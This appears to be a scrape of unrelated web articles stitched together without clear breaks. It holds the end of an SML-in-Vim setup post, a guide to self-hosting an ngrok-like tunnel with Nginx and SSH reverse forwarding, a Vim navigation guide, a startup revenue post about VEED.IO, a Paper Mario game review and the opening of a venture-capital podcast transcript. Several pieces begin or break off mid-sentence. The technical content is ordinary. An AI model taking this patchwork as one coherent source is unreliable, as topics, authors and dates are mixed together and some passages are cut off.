<li>I ask ALE to only run when the file was saved (not when it was opened or
edited).</li>
</ul>


<p>(You’ll also see a bunch of settings for other languages, but you won’t find any
SML-specific config… it’s not needed!)</p>

<p>Also, a tip for those who’ve never used Vim’s location list: you can close the
list of errors with <code>:lclose</code>.</p>

<h3>Using ALE with CM files</h3>

<p>Sometimes a single SML file is self-contained enough to type check on it’s own.
But most of the time, we’re working with multi-file SML projects. With SML/NJ,
multi-file SML projects are managed using CM files (<code>*.cm</code> files) which declare
groups of SML files that must be compiled together to make sense.</p>

<p>ALE’s support for SML handles both of these scenarios. When opening an SML file,
ALE will search up the folder hierarchy for any <code>*.cm</code> file, stopping when it
finds the first one. When there are multiple in a single folder, it takes the
alphabetically first option.</p>

<p>Usually this works fine but sometimes ALE picks the wrong one. There are
instructions for how to manually fix this by setting some variables in the ALE
help:</p>

<figure><div><div><pre><code><span>:help ale-sml-options</span></code></pre></div></div></figure>


<h3><code>vim-better-sml</code></h3>

<p>After all that, I still wasn’t satisfied with developing SML in Vim, so I wrote
a plugin to make it even better: <a href="https://github.com/jez/vim-better-sml">vim-better-sml</a>. Here’s a
quick rundown of its features:</p>

<ul>
<li>It supports for embedding a REPL directly inside Vim.</li>
<li>It supports asking for the type of a variable under the cursor.</li>
<li>It supports jump to definition, even into the Standard Basis Library.</li>
<li><code>*.sig</code> files are properly detected as SML signature files.</li>
<li>Many small annoyances with syntax highlighting and indentation are fixed.</li>
</ul>


<p>For more information, including how to install it, check out the homepage:
<a href="https://github.com/jez/vim-better-sml">vim-better-sml</a>. For the most part, the plugin itself will
guide you through the installation, declaring any dependencies that might be
missing.</p>

<p>I recorded a screencast of all those features above in action, which you might
want to check out:</p>

<p><a href="https://youtu.be/Z5FsPZ5cm8Y"><img src="https://blog.jez.io/images/vim-better-sml-demo-thumbnail.png" alt="thumbnail"></a></p>

<h2>General Vim Settings</h2>

<p>As a quick addendum, one common complaint people have when editing SML is that
it forces the line to wrap if it extends past 80 characters. Some people don’t
like that, and others don’t like that it doesn’t do it frequently enough
(namely, it only wraps the line if your <strong>cursor</strong> extends past 80 characters,
not the end of the line).</p>

<p>If you don’t want Vim to do any of this wrapping, run this:</p>

<figure><figcaption><span>Disable hard line wrapping</span></figcaption><div><div><pre><code><span><span>setlocal</span> textwidth<span>=</span><span>0</span></span></code></pre></div></div></figure>


<p>If you’d like this change to persist between Vim sessions, add it to
<code>~/.vim/after/ftplugin/sml.vim</code>. These folders and file likely don’t exist
yet; you’ll have to create them. The <code>after</code> folder in Vim is used to override
settings loaded from plugins.</p>

<p>Alternatively, if you’d like a little better idea when Vim’s going to hard wrap
your line, you can add one of these lines to your vimrc:</p>

<figure><figcaption><span>Show a color column</span></figcaption><div><div><pre><code><span><span>" Always draw the line at 80 characters</span>
</span><span><span>set</span> colorcolumn<span>=</span><span>80</span>
</span><span>
</span><span><span>" Draw the line at whatever the current value of textwidth is</span>
</span><span><span>set</span> colorcolumn<span>+=</span><span>0</span></span></code></pre></div></div></figure>


<p>That way, it’s easier to see when a line is getting long.</p>

<h2>TL;DR</h2>

<p>We covered a lot, so here’s a quick recap:</p>

<ul>
<li>Install SML locally. It’s super easy to do on macOS and Linux (use your
package manager), and means you don’t have to have a Wi-Fi connection to
develop SML.</li>
<li>Invest time into learning Vim. Here’s a reference: <a href="https://github.com/jez/vim-as-an-ide">Vim as an
IDE</a>.</li>
<li>Install <a href="https://github.com/dense-analysis/ale">ALE</a>. It tells you what lines your errors are on.</li>
<li>Install <a href="https://github.com/jez/vim-better-sml">vim-better-sml</a>. It includes a whole host of added
power features.</li>
</ul>


<p>And as always, you can see even more Vim settings in my <a href="https://github.com/jez/dotfiles">dotfiles
repo</a> on GitHub.</p>

            <p>
    Posted on January 29, 2019
    
</p>

<p>Ngrok is a fantastic tool for creating a secure tunnel from the public web to a machine behind NAT or a firewall. Sadly, it costs money and it’s proprietary. If you’re a developer, odds are that you’re already renting a server in the public cloud, so why not roll your own ngrok?</p>
<p>It turns out that you can do it using free, off-the-shelf tools, with no sophisticated scripting required! In this article, I’ll show you how.</p>
<h2 id="step-1.-configuring-nginx">Step 1. Configuring Nginx</h2>
<p>Use a server block like this, so that incoming HTTP connections to <code>tunnel.yourdomain</code> are reverse proxied into the application listening on port <code>3333</code>.</p>
<pre><code>server {
    server_name tunnel.yourdomain;

    access_log /var/log/nginx/$host;

    location / {
	    proxy_pass http://localhost:3333/;
	    proxy_set_header X-Real-IP $remote_addr;
	    proxy_set_header Host $host;
	    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
	    proxy_redirect off;
    }

    error_page 502 /50x.html;
    location = /50x.html {
	    root /usr/share/nginx/html;
    }
}</code></pre>
<p>With this configuration in place, suppose I visited <code>tunnel.yourdomain</code>. Nginx will receive the connection, and see that it should reverse proxy it. It will effectively pass the connection on to whatever application is listening on port <code>3333</code>. Currently, there is nothing listening on this port, so we will get a <code>502 Bad Gateway</code> or <code>404 Not Found</code> error from Nginx.</p>
<p>Let’s fix that.</p>
<h2 id="step-2.-using-an-ssh-reverse-tunnel">Step 2. Using an SSH reverse tunnel</h2>
<p>SSH reverse tunnelling port <code>N</code> to port <code>K</code> means making sshd listen on port <code>N</code> and effectively transfer incoming connections over the SSH connection to the SSH client. The SSH client will then transfer the connection to the application listening on port <code>K</code> on the client machine.</p>
<p>Here’s the command to run on your client machine: <code>ssh -R N:localhost:K yourdomain</code></p>
<p>An interactive session on your server should begin; while it is open, the reverse tunnel from port <code>N</code> to port <code>K</code> is active, and sshd will allow connections originating only from <code>localhost</code>, i.e.&nbsp;your server.</p>
<p>Choosing <code>N</code> = <code>3333</code> will make it so Nginx reverse proxies incoming connections on <code>tunnel.yourdomain</code> into sshd, over the SSH connection, and into the application running on your local machine on port <code>K</code>.</p>
<p>To test this out, on your local machine, in one shell run <code>python -m http.server 8888</code> and in another shell run <code>ssh -R 3333:localhost:8888 yourdomain</code>. Visit <code>tunnel.yourdomain</code>. You should see a directory listing for whatever directory you were in when you ran the Python command!</p>
<p>However, there’s a glaring problem with this setup.</p>
<h2 id="step-3.-securing-the-connection-in-the-browser">Step 3. Securing the connection in the browser</h2>
<p>The connection the browser is making to Nginx is at the moment not secure: it was a plain HTTP connection. You can fix this by obtaining a free TLS certificate with Letsencrypt, and using it to secure the connection the browser is making.</p>
<p>There are already excellent tutorials available on setting up Letsencrypt, so I won’t repeat that here. I recommend consulting the ArchWiki article <a href="https://wiki.archlinux.org/index.php/Certbot">here</a>. Letsencrypt is a self-hosters dream-come-true since it is truly a set-it-and-forget-it type of thing. With the appropriate setup, (namely a simple systemd timer,) the certificate you get will renew itself when it its expiry is approaching.</p>
<p>Once you have a certificate, it suffices to adjust the Nginx server block above so it looks like this.</p>
<pre><code>server {
    server_name tunnel.yourdomain;

    access_log /var/log/nginx/$host;
    
    # These three lines are new.
    listen 443 ssl;
    ssl_certificate /path/to/tls/cert/fullchain.pem;
    ssl_certificate_key /path/to/tls/cert/privkey.pem;

    location / {
	    proxy_pass http://localhost:3333/;
	    proxy_set_header X-Real-IP $remote_addr;
	    proxy_set_header Host $host;
	    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
	    proxy_redirect off;
    }

    error_page 502 /50x.html;
    location = /50x.html {
	    root /usr/share/nginx/html;
    }
}</code></pre>
<p>Only <em>three lines</em> need to be added!</p>
<h3 id="conclusion">Conclusion</h3>
<p>With very little setup, we saw how to configure Nginx to act as a reverse proxy, and how to use an SSH reverse tunnel. By combining these off-the-shelf tools, we essentially replicated the core functionality of the fantastic tool Ngrok. Using this double-reverse-proxy technique, web applications running on a machine behind NAT or a firewall can be accessed easily and securely from a public domain or IP address.</p>

July 15, 2020 | https://blog.bespinian.io/posts/efficient-navigation-in-vim/ | <a href="https://web.archive.org/web/*/https://blog.bespinian.io/posts/efficient-navigation-in-vim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>When editing a file, it’s quite crucial that you can navigate your cursor around rather quickly. <a href="https://www.vim.org/">Vim</a> and <a href="https://neovim.io/">NeoVim</a> allow for many different ways of doing so which, depending on the situation, can be more or less efficient and useful. This article examines the different ways of moving the cursor and compares them. Here, the term “efficiency” refers to navigating the cursor with as little time and effort (i.e. the number of keystrokes) as possible.</p>
<h2 id="using-the-mouse">Using the Mouse</h2>
<p><strong>TL;DR: Not recommended</strong></p>
<p>Using the mouse pointer to navigate Vim may seem like an obvious choice for users coming from a GUI editor like <a href="https://code.visualstudio.com/">Visual Studio Code</a> or similar. However, in Vim, the goal is to keep your fingers on the “home row” of the keyboard (the row where the <code>F</code> and the <code>J</code> keys reside) and not having to move them greatly towards the touchpad or even the mouse. This should reduce the strain on your hands and wrists and make editing more efficient. Therefore, navigating with the mouse should be highly discouraged in most situations and is even disabled by default.</p>
<p>It can be helpful to enable it for users transitioning from one of the aforementioned editors who would like to have a smooth transition by allowing themselves to use the mouse initially and switching it back off again later in their learning journey. To turn on mouse navigation, add the following to your configuration file (either <code>~/.vimrc</code> or <code>~/.config/nvim/init.vim</code>):</p>
<div><pre><code data-lang="vim"><span>" Temporarily enable mouse support</span><span>
</span><span></span><span>set</span> <span>mouse</span>=<span>a</span><span>
</span></code></pre></div><p>This will allow you to point and click to move the cursor and to scroll through the current buffer.</p>
<h2 id="using-the-arrow-keys">Using the Arrow Keys</h2>
<p><strong>TL;DR: Not recommended</strong></p>
<p>Again, for users used to other text editors or even word processing software like <a href="https://www.libreoffice.org/discover/writer/">LibreOffice Writer</a>, it may be tempting to use what they know. In these programs, you mostly use the arrow keys for keyboard-based navigation. This is not recommended because… you guessed it: They require the user to move their fingers away from the home row.</p>
<p>The alternative is, as described in the next section, to use the <code>h</code>, <code>j</code>, <code>k</code> and <code>l</code> keys on the keyboard which are conveniently placed at the center and where you most likely have your fingers most of the time.</p>
<h2 id="using-hjkl">Using h,j,k,l</h2>
<p><strong>TL;DR: Use for small navigations. Use in combination with relative line numbers.</strong></p>
<p><code>h</code>, <code>j</code>, <code>k</code> and <code>l</code> are the basic movement keys in Vim. They should be used instead of the usual arrow keys on the keyboard to, as discussed above, keep your fingers on the home row as much as possible. It takes a little practice but will pay off in the long run.</p>
<p>One hugely important thing to do with these keys is to not press them multiple times in sequence or even hold them down to move several columns or rows. As with many commands in Vim, they can be prefixed with numbers to move multiple times. For example, <code>12j</code> can be used rather than pressing the <code>j</code> key twelve times which is, obviously, much more efficient (3 vs. 12 keystrokes). However, it is recommendable to only use these keys for small movements and mostly to move lines up or down because there are more efficient ways of moving longer vertical distances or horizontal distances in general.</p>
<p>It can be very useful to enable relative line numbers to see at a glance what number to prefix <code>j</code> or <code>k</code> with to move to a certain line. They can be enabled by adding the following two lines to your configuration file:</p>
<div><pre><code data-lang="vim"><span>" Enable relative line numbers</span><span>
</span><span></span><span>set</span> <span>relativenumber</span><span>
</span><span></span><span>set</span> <span>number</span><span>
</span></code></pre></div><p>This will always show the absolute number of the line the cursor is currently on and relative numbers for all others.</p>
<h2 id="navigation-within-a-line">Navigation Within a Line</h2>
<p><strong>TL;DR: Mostly use <code>f</code>. Also consider <code>w</code>,<code>b</code>,<code>e</code>,<code>^</code> and <code>$</code>.</strong></p>
<p>So far, we’ve mostly looked at navigating from one line to another. The next step is to navigate within a line. In many cases, the straight forward thing to do is to use <code>w</code> or <code>W</code> to move to the next word, <code>b</code> or <code>B</code> to move to the previous word or even <code>e</code> or <code>E</code> to move directly to the end of the next word. For all of them, the lowercase variant considers a “word” to be what we intuitively see as one using delimiters like <code>-</code>, <code>/</code> or <code>.</code> to separate one word from another. The uppercase variant considers anything a word that is delimited by whitespace. Obviously, any of these commands can be prefixed with a number to jump multiple words in one go (e.g. <code>7w</code>). Other useful commands are <code>^</code> which moves to the first non-whitespace character of the line and <code>$</code> to move to the last character of a line. Considering the following line</p>
<p>with the cursor currently on the <code>g</code> character, pressing the following commands is the most efficient way to get to a specific target character:</p>
<table>
<thead>
<tr>
<th>Target Character</th>
<th>Command</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>j</code></td>
<td><code>2w</code></td>
</tr>
<tr>
<td><code>m</code></td>
<td><code>W</code></td>
</tr>
<tr>
<td><code>d</code></td>
<td><code>B</code></td>
</tr>
<tr>
<td><code>i</code></td>
<td><code>e</code></td>
</tr>
<tr>
<td><code>l</code></td>
<td><code>E</code></td>
</tr>
<tr>
<td><code>a</code></td>
<td><code>^</code> or <code>0</code></td>
</tr>
<tr>
<td><code>o</code></td>
<td><code>$</code></td>
</tr>
</tbody>
</table>
<p>When moving multiple words back and forth or to a specific place within a word, <code>t</code> and <code>f</code> are incredibly helpful. Especially <code>f</code> moves to the next occurrence of a specific character which lets you make big jumps within a line. The difference is that <code>f</code> moves to a character and <code>t</code> moves to right before a character. So <code>t</code> is mostly useful for deleting everything to a character. These commands’ uppercase variants <code>F</code> and <code>T</code> do the same thing but backwards. All of these commands can be “repeated” with the <code>;</code> command which jumps to the next occurrence of the targeted character while <code>,</code> jumps to the previous one.</p>
<h2 id="search">Search</h2>
<p><strong>TL;DR: Great for moving larger distances vertically and horizontally</strong></p>
<p>By far one of the most efficient ways of moving longer distances horizontally and vertically in a buffer is to use the search. The <code>/</code> key lets you search for a term and conveniently jump to its location. Pressing the <code>n</code> and <code>N</code> keys jumps to the next and previous occurrence of the search term respectively. The <code>?</code> key searches backwards from the current cursor position (which inverts <code>n</code> and <code>N</code>). Even though, the main purpose of the search command is obviously to search, it is an incredibly powerful tool to navigate quickly and efficiently.</p>
<p>The user experience of the search command can be vastly improved by adding the following settings to your configuration file:</p>
<div><pre><code data-lang="vim"><span>" Incrementally search while typing</span><span>
</span><span></span><span>set</span> <span>incsearch</span><span>
</span><span></span><span>" Use smart case for searching</span><span>
</span><span></span><span>set</span> <span>ignorecase</span><span>
</span><span></span><span>set</span> <span>smartcase</span><span>
</span><span></span><span>" Highlight searches</span><span>
</span><span></span><span>set</span> <span>hlsearch</span><span>
</span><span></span><span>" Use &lt;C-L&gt; to clear the highlighting of :set hlsearch.</span><span>
</span><span></span><span>if</span> <span>maparg</span>(<span>'&lt;C-L&gt;'</span>, <span>'n'</span>) ==# <span>''</span><span>
</span><span></span>  <span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>C</span>-<span>L</span>&gt; :<span>nohlsearch</span>&lt;<span>C</span>-<span>R</span>&gt;=<span>has</span>(<span>'diff'</span>)?<span>'&lt;Bar&gt;diffupdate'</span>:<span>''</span>&lt;<span>CR</span>&gt;&lt;<span>CR</span>&gt;&lt;<span>C</span>-<span>L</span>&gt;<span>
</span><span></span><span>endif</span><span>
</span></code></pre></div><p><code>incsearch</code> will make sure that the search pattern is applied incrementally while typing instead of only after pressing the enter key. The combination of <code>ignorecase</code> and <code>smartcase</code> ignores the case of the search term when not using any uppercase letters and doesn’t ignore it when using at least one uppercase letter which is quite convenient and surprisingly intuitive. <code>hlsearch</code> highlights any matches for the search term allowing to easily jump between them using <code>n</code> and <code>N</code>. The last statement lets you clear the highlighted search results by pressing <code>ctrl+l</code> to unclutter your view once done searching and jumping.</p>
<p>All in all, search is one of the powerful tools for intuitive and efficient navigation. It covers the common use case of knowing the word or part of a word to navigate to but not having your eyes directly pointed there yet. Furthermore, it’s simply the fastest way of jumping somewhere in many cases and beats other methods of navigation quite often in that regard.</p>
<h2 id="clunky-movements">Clunky Movements</h2>
<p><strong>TL;DR: Use for very specific use cases only. Consider <code>gg</code> and <code>G</code> for getting to know a file.</strong></p>
<p>In this section we’ll discuss what can be referred to as “clunky movements”. They let the user navigate larger distances in the buffer while sacrificing precision. These commands are less useful for exactly that reason. Vim can be a very efficient text editor by letting the user think about what they want to change, jumping precisely there with very few keystrokes, entering insert mode, performing a change with scalpel-like precision and finally exiting insert mode as soon as it’s done. The movement commands in this section however, get the cursor around the document as a whole while it’s hard for the user to predict at a glance, which line and column exactly they will land on.</p>
<p>A good example are the <code>H</code>, <code>M</code> and <code>L</code> keys which take the cursor to the top, the middle or the bottom of the current view port respectively. While this is a very big movement with just one keystroke, it’s highly likely that they won’t exactly get the cursor to the line needed but rather will have to be accompanied by pressing <code>j</code> or <code>k</code> multiple times which will result in much more thinking and many more keystrokes than what can be achieved with other methods. Similar are the <code>{</code> and <code>}</code> keys which take the cursor to the next paragraph (a block of text delimited by blank lines).</p>
<p>A useful exception to that are the <code>gg</code> and <code>G</code> commands which take the cursor to the first or the last line of a buffer respectively. It’s easy and effortless to predict where these movements will take you. Especially the <code>G</code> command can be quite useful because it allows to append to a file with just two keystrokes (<code>G</code> followed by <code>o</code>).</p>
<h2 id="plugins">Plugins</h2>
<p><strong>TL;DR: Install only the necessary plugins. Check out fzf!</strong></p>
<p>So far, we’ve only talked about features that are built into Vim or that can be configured on a vanilla installation. However, there are many useful plugins which can make navigating Vim even more efficient. It is important to carefully pick them though as any plugin can make Vim slower and/or less stable.</p>
<h3 id="fzf">fzf</h3>
<p>One of the most useful plugins is <a href="https://github.com/junegunn/fzf.vim">fzf</a> which is a great one to have in general. It offers many helpful commands like <code>:BLines</code> for searching the current buffer with intelligent fuzzy matching or <code>:Rg</code> for even searching the whole project for specific patterns which, in contrast to the other methods we’ve looked at so far, lets the user navigate between files. fzf is a tool that can be used for jumping between files and buffers but also between different locations within them. I highly recommend to check it out and add the following lines to your configuration file:</p>
<div><pre><code data-lang="vim"><span>" Jump to specific file</span><span>
</span><span></span><span>nnoremap</span> &lt;<span>C</span>-<span>P</span>&gt; :<span>Files</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>" Search whole project</span><span>
</span><span></span><span>nnoremap</span> \ :<span>Rg</span>&lt;<span>space</span>&gt;<span>
</span></code></pre></div><p>The first line lets you open …</p></div></div>

                    <p>VEED.IO has grown fast.</p><p>12 months ago we turned on our paywall and made our first ever SaaS $1.</p><p>For any entrepreneur, this is a moment that they will never forget. Tim and I could not control our excitement.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG_0318.jpeg"><figcaption>Our first ever $1 - 12 months ago</figcaption></figure><p>You achieved the impossible, there is light at the end of the tunnel and everything you have been dreaming about and working towards might come true!</p><p>Exactly 12 months after this first payment, we have managed to cross the seemingly impossible task of hitting $83,333 MRR / $1M ARR.</p><p>And the best part is we did it 100% self-funded, with no external funding.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG-20200703-WA0015-1.jpg"><figcaption>1M ARR - Tim &amp; Sabba - VEED.IO</figcaption></figure><p>In this post, I would like to share relevant financial data that might give other founders insights into how to build their own bootstrapped SaaS to $1M ARR.</p><p>I would also like to share some insights into our attitudes and believes that have got us to where we are. Such as our bullish attitude towards growth, how we build the product and how we think about the future of VEED.</p><h3 id="the-numbers">The Numbers</h3><p>First off, we are aware that we did this very fast and we also go lucky (I talk about this more below) From the outside, VEED might look like an overnight success, however it was 10 years in the making!</p><p>Before we look at the numbers, I would like to provide some context. When we started charging, we already had about 30,000 MAU. However, pretty much none of those users would speak to us and we were unsure that if we added the paywall any of the users would upgrade.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-149.png"><figcaption>1M ARR in 12 Months</figcaption></figure><p>Growth starts slow, but having a product that is scalable and can we assessed globally from day one really means the sky is the limit. 6 months in, our projection for 1M ARR was December, then August and due to increasing demand influenced by the pandemic, we hit 1M ARR in June. </p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-150.png"><figcaption>ARR Milestones</figcaption></figure><p>As you can see, the first $100K ARR took 171 days to reach and the following $100K took just 48 days. The reason why the 2nd was much quicker than the first is because we were learning from users and building the required product features. We were also learning more about our acquisition channels and were able to double down on them. </p><p>Although 171 days is not a very long period of time, turning up to the office and putting in 12 hours every day can be really draining. The stress of getting to profitability was really real. For bootstrapped startup, be aware that it can really take some time.</p><p>Like with anything with compounding growth your first 100K takes ages, but the next comes a lot quicker. It took 12 months for us to hit 1M ARR, however we are projected to hit 2M in just 4 months!</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-151.png"><figcaption>1M ARR Traffic Growth</figcaption></figure><p>Bootstrapping is hard work, but as you grow it gets a lot easier. The speed in which you grow makes a HUGE difference to the bootstrapping experience. You need to get the flywheel moving super fast to keep everyone motivated and to get you to ramen profitability.</p><p>6 months after our first-ever paid users, we reached $10K MRR. Although a relatively small sum, it was enough to support the founding team.</p><p>This is important as it means you can donate 100% of your time building and growing your product.</p><p>However, if it took 18 months to reach this goal, the market would have moved on, our attitudes towards the product would have changed and maybe we would have been disillusioned. Otherwise known as the "Long, Slow, SaaS Ramp of Death"</p><p>From our experience, there are three keys to successfully bootstrapping.</p><h3 id="your-ideas-at-the-core-"><br>Your ideas at the core.</h3><p>A common mistake I often see is founders building way too much!</p><p>Building any app is hard work. If you set out to build a fully-fledged product you might never finish and more importantly, you are not getting valuable feedback from your users to help shape your product.</p><p>Setting the bar too high will also delay your launch and also make responding to feedback much harder due to a bloated codebase and feature set.</p><p>After years of building VEED, we don't even think we are at version 1.0.</p><p>We believe the best thing to do is to build your MVP and get it out into the world as soon as possible. The first version of VEED had only 4 features, Trim, Crop, Draw and Text. There was no login, no accounts, just a simple web app. Looking back, I think we made way too much, we should have launched with just a really good crop tool.</p><p>After we saw that users were responding well to your app, we started building new features that they had requested. This kickstarted our build measure learn process. So you need to find the minimum set of features that represents your idea.</p><h3 id="validate-your-ideas-fast-">Validate your ideas fast.</h3><p>When I first entered the startup world, I was under the impression that you needed a new and original idea. For many years I tried that approach with little to no success.</p><p>In my opinion, the best way to validate an idea is to look to see if this is a product people are already willing to pay for.</p><p>For example, I would feel comfortable that people are willing to pay for an email marketing tool. Why? Because Mailchimp has proven this for us!</p><p>This questions now is, how are you different or what subset of users do you believe they are undeserving?</p><p>For us at VEED, we knew people where the will to pay for video editing software (I know because I had an Adobe subscription myself). What we did differently is we just put it online and targeted, short-form content creators.</p><p>Why? Because we believe they were being underserved by legacy video editing platform. One of my fave tutors from art school once told me "An original idea is not something completely new, it just 10% different"</p><p>If it feels like you are pushing a boulder uphill and struggling to get traction, it might be time to move to the next idea. Seriously, the faster you can get to this realisation, the better.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article><p><time datetime="2020-07-15T13:00:00">July 15, 2020</time> by <a href="https://www.theverge.com/21324614/paper-mario-the-origami-king-review-nintendo-switch">The Verge</a> | <a href="https://newsworthy.to/category/entertainment">Entertainment</a></p><p>A great comedy that also happens to be a great game</p><p>Super Mario’s roleplaying adventures have always been playful twists on the genre. RPGs can be uptight, all melodrama and end-of-the-world theatrics. But games like <em>Super Mario RPG</em> and the <em>Mario &amp; Luigi</em> series took what made RPGs great — the strategic battles, lengthy adventures, and vast stories — and infused them with humor and charm. <em>Paper Mario: The Origami King</em> continues this tradition but updates it in lots of clever ways. It’s the rare game where being funny is its biggest strength.</p><p>As with most Mario adventures, <em>The Origami King</em> involves trouble with Princess Peach, but not in the typical damsel in distress way. At the outset, Mario and his brother arrive at Toad Town for an origami festival, only to discover the city is mostly deserted. Inside the castle, they find a disturbing — and origami-fied — version of the princess. “Why haven’t you joined me in folding glory?” she asks. As it turns out, the princess, and much of the Mushroom Kingdom, are under the control of an evil origami wizard bent on reshaping the world in his image.</p><p>It’s an admittedly silly premise, but it works; the villains and their intentions feel appropriately evil, and it’s a great excuse to venture across the world. As part of his scheme, the origami king uses five gigantic pieces of ribbon to rip Peach’s castle out of the ground and transport it to a remote mountaintop. The goal is simple: destroy the ribbons to get into the castle. Your destination is almost always in view; when you’re out in the world, you can see the ribbons stretching across the landscape until you finally manage to remove them.</p><p><em>The Origami King</em> plays out sort of like an open-world RPG. You play as a flat rendition of Mario venturing across the world — to ancient deserts, underwater dungeons, and abandoned theme parks — all while solving often arcane brain teasers to open up new areas, eliminate the origami menace, and dispose of the ribbons. There are RPG-like mechanics like equippable weapons and additional party members, including an amnesiac Bob-omb and a Toad archaeologist. Battles are clever turn-based affairs that are essentially puzzles: you have to spin enemies around on a wheel to line them up so you can get the right attack in before a timer runs out. In most RPGs, I mash the attack button through random battles, but here, I had to actually pay attention.</p><p>Many of the elements streamline what can often be a tedious and fiddly genre. The battles, outside of bosses, are snappy and fun, and you only have to worry about a few items and skills to succeed. If you get stuck, a helpful origami friend named Olivia is available at any time to give you helpful hints, sort of like a less annoying version of Navi from <em>Ocarina of Time</em>. <em>The Origami King</em> strikes a nice balance between being approachable but still having depth. It’s also wonderfully tactile. While Mario can jump, he also has a hammer to smash everything and anything around him, which he does to open up secret areas, solve puzzles, and rescue flattened toads hidden almost anywhere you look.</p><p>The game looks and plays wonderfully, but really, the star is its sense of humor. It’s downright silly. There are copious puns and visual jokes and all kinds of things that don’t make sense but are delightful regardless. For instance, since you’re made of paper, you can travel around the world via fax machine; the game calls this “fax travel.” At one point, after wandering through a forest of talking trees, I came across firewood chanting “light me!” and “we must burn!”</p><p>Everything is goofy: the most difficult bosses are sentient office supplies, and there are multiple surprise musical numbers and performances, including a multipart stage play that ends in a Shy Guy ballet. Much like <a href="https://www.theverge.com/2019/10/31/20942003/luigis-mansion-3-review-nintendo-switch-gooigi-comedy">the most recent <em>Luigi’s Mansion</em></a>, a lot of the silliness comes from slapstick comedy, as you take your hammer and smash things to see what happens. It could be an unusual toad unfolding after previously being disguised as an origami frog or butterfly, or a secret cafe full of grumbling Bowser minions. At the very least, you’ll see colorful confetti rain down from the tree you just bonked. The story even has rare moments of poignant drama to round out the experience; <em>Paper Mario</em> is not a game where I expected to be shocked by a character’s death, but the team at Nintendo pulled it off masterfully.</p><p>The fact that <em>The Origami King</em> is a great game almost feels like a bonus. It could’ve simply been a vehicle for Nintendo’s goofs, and I would’ve enjoyed it, such is the rarity of truly funny comedy games. But it also happens to be a fantastic example of how to freshen up the classic RPG formula with a few new ideas and clever simplification. In virtually every regard, the latest <em>Paper Mario</em> is anything but flat.</p><p><small>Paper Mario: The Origami King </small><small><em>launches on July 17th on the Nintendo Switch.</em></small></p></article></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="target-id5f133bbb17c3b"><p>Peter Livingston 0:00<br> The biggest thing is that when you actually raise a fund all those LPs that you raise a fund from are they become your bosses and you’re beholden to them if one of them’s not happy or if you deviate from strategy that you promised them in the beginning, you end up with conflict and friction. And what’s really cool about the syndicate model is that I’m more of like a professional blogger than I am a venture capitalist.</p><p>Jay Clouse 0:24<br> The startup investment landscape is changing. and world class companies are being built outside of Silicon Valley. We find them, talk with them and discuss the upside of investing in them. Welcome to Upside.</p><p>Hello, hello. Hello, and welcome to the Upside podcast, the first podcast finding upside outside of Silicon Valley. I’m Jay Clouse, and I’m accompanied by my co host, Mr. Studying all the time Eric Hornung.</p><p>Eric Hornung 1:04<br> Jay you know that I love to hit the books.</p><p>Jay Clouse 1:06<br> Love hitting the books, love reading the books, love talking about the books, love writing summaries of the books.</p><p>Eric Hornung 1:11<br> Books about the books. That would have been nice if I actually had written a book about a book, but I haven’t. Yeah, I’m back on the study wagon, which is the least fun wagon in any caravan. Yeah, every every night just studying Jay.</p><p>Jay Clouse 1:24<br> What are you studying for?</p><p>Eric Hornung 1:25<br> Right now? I’m studying for a FINRA exam, which have to have to do my job.</p><p>Jay Clouse 1:31<br> So we’re talking flashcards.</p><p>Eric Hornung 1:34<br> You know, when there’s a lot of formulas, I do flashcards but for concepts, I prefer to just do practice questions. So there’s this bank of 2600 questions that may or may not be like the questions that are on the exam, and you just go through those until your eyes glaze over.</p><p>Jay Clouse 1:50<br> I am thankful that I did not choose a career path that required me to continue taking tests.</p><p>Eric Hornung 1:55<br> Yeah, I’m not the biggest fan of the tests in the studying. I don’t really have anything interesting to say about them there because they are so boring?</p><p>Jay Clouse 2:03<br> I don’t remember what it’s like to study. I don’t remember what it’s like to convince yourself that you know something. I don’t know, I just forget what it’s like to even study. memorization has not been my strong suit since I was probably a kid. But definitely not since college, which I feel like studying is mostly memorization.</p><p>Eric Hornung 2:20<br> Yeah, that’s fair. It’s do you know these facts? It’s definitely different than the act of learning of launching a podcast or working with some software or actually building something. So the dichotomy between building the podcast and studying for legacy finance exams, just makes me feel like why do we have entrepreneurship majors in college.</p><p>Jay Clouse 2:42<br> But that’s the price of admission for getting into the world of finance. And speaking of the world of finance, today, we’re talking with Peter Livingston, the founder and general partner of Unpopular ventures. Unpopular ventures is a new VC firm dedicated to the entrepreneurs who are proud to be unpopular. They love it. opportunities that are off the beaten path, particularly when they’re led by outstanding teams who have discovered something surprising. But Eric, I wouldn’t even have described Unpopular ventures as a VC firm the way that it’s described in their in their bio, because this is a syndicate, which is something that you taught me that exists, how you how do you Venn diagram syndicates with VC firms.</p><p>Eric Hornung 3:22<br> Okay, so a syndicate is just a model for gaining investment and a fund is another model for gaining investment. In the fund model you have LPs, they commit a bunch of capital upfront and you invest in a portfolio of deals over the course of usually 10 years. In a syndicate, you go deal by deal so instead of saying, Hey, Mr. or Mrs. LP give me 100 million dollars, and I will do 100 deals with that. You say, Mr. &amp; Mrs. LP here is one deal. Do you want to give me a million dollars and they say yes or no,</p><p>Jay Clouse 3:57<br> And syndicates in Unpopular ventures in particular is operated on Angel list where they have over 1000 LPs who have invested more than $10 million across more than 30 companies since starting in just early 2019. Sounds like a lot of LPs.</p><p>Eric Hornung 4:13<br> Yeah, but you’re not dealing without all of them all the time. You’re only dealing with them on each deal that they’re in.</p><p>Jay Clouse 4:19<br> It’s a new model. I’m excited to learn more about it. I’m excited to talk with Peter. We’d love to hear your thoughts on this syndicate conversation as 